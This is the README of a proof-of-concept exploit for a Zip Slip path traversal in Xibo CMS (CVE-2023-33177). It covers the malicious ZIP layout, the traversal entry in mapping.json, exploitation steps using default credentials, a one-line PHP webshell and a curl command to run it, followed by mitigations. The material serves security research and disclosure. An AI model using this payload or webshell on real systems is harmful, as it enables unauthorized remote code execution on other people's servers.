# Xibo CMS Zip Slip RCE Exploit CVE-2023-33177

This exploit demonstrates a **path traversal vulnerability** in Xibo CMS (CVE-2023-33177) that allows remote code execution through malicious layout imports.

## Vulnerability Details

**CVE/Advisory:** CVE-2023-33177
**Affected Versions:**
- Xibo CMS 1.8.0 - 2.3.16
- Xibo CMS 3.0.0 - 3.3.4

**Vulnerability Type:** Path Traversal (Zip Slip)
**Impact:** Remote Code Execution (RCE)

### Technical Summary

Xibo CMS allows authenticated users to import layout files via ZIP archives. The import functionality fails to properly validate file paths in the `mapping.json` file, allowing an attacker to write files outside the intended library directory using path traversal sequences (`../../`).

## How the Exploit Works

1. **Creates a valid Xibo layout export structure** with required JSON files
2. **Injects path traversal in `mapping.json`**: Uses `../../web/shell.php` as the file path
3. **Places webshell in traversed path** within the ZIP structure at `library/../../web/shell.php`
4. **Xibo extracts without validation**: Resolves to `/var/www/cms/web/shell.php`
5. **Achieves RCE**: Webshell is accessible at the web root

### The Vulnerability Chain

```
Zip contains: library/../../web/shell.php
Xibo reads:   library/ + ../../web/shell.php (from mapping.json)
Xibo writes:  /var/www/cms/library/temp/ + ../../web/shell.php
Result:       /var/www/cms/web/shell.php ← Webshell in web root!
```

## Usage

### Generate the Exploit

```bash
python3 create_exploit.py
```

This creates `exploit.zip` containing the malicious layout package.

### Exploitation Steps

1. **Access Xibo CMS** and log in with credentials (default: `xibo_admin` / `password`)
2. **Navigate to Import**: Design → Layouts → Import
3. **Upload `exploit.zip`**
4. **Ignore any JSON errors** - the webshell has already been written to disk
5. **Execute commands via webshell**:
   ```bash
   curl 'http://localhost:8080/shell.php?cmd=id'
   ```

## File Structure

The exploit ZIP contains:

```
exploit.zip
├── layout.json          # Valid Xibo layout definition
├── playlist.json        # Empty playlist (triggers JSON import)
├── mapping.json         # Contains path traversal payload
└── library/
    └── ../../web/
        └── shell.php    # PHP webshell (gets extracted to web root)
```

## Webshell Functionality

The embedded webshell is minimal:

```php
<?php system($_GET["cmd"]); ?>
```

Access it via: `http://<target>/shell.php?cmd=<command>`

## Mitigation

**Patched Versions:**
- Upgrade to Xibo CMS 2.3.17+ (for 2.x branch)
- Upgrade to Xibo CMS 3.3.5+ (for 3.x branch)

**Mitigation Strategies:**
1. Validate all file paths in ZIP archives before extraction
2. Reject paths containing `..` or absolute paths
3. Use secure extraction methods that prevent directory traversal
4. Implement proper input validation on import functionality
5. Restrict file upload permissions to authenticated, authorized users only

## Legal & Ethical Notice

This exploit is provided for:
- Educational purposes
- CTF competitions
- Authorized security testing
- Defensive security research

**Do not use this exploit against systems you do not own or have explicit permission to test.**

## References

- **Advisory:** GHSA-jj27-x85q-crqv
- **Xibo CMS:** https://xibo.org.uk/
- **Zip Slip Vulnerability:** https://security.snyk.io/research/zip-slip-vulnerability
- **CVE-2023-33177:** https://nvd.nist.gov/vuln/detail/CVE-2023-33177


## Author

complexusprada
November 2025
